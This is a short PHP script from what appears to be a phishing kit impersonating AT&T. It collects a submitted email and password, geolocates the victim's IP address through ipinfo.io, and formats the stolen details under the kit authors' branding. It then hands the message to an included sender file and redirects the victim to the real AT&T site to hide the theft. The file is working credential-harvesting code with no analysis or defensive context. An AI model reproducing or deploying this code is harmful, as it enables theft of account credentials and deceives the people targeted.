<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$msg = "===========[ ATT ]===========\n";
$msg .= "ATT's By Trinity\n";
$msg .= "=====================\n";
$msg .= "Email : ".$_POST['userid']."\n";
$msg .= "Passworth : ".$_POST['password']."\n";
$msg .= "=============================\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "===========[ cr4nk Tm. ]==========\n";
include("mp4/SenMe.php");

  {
		   header("Location: https://www.att.com/");

	   }
?>
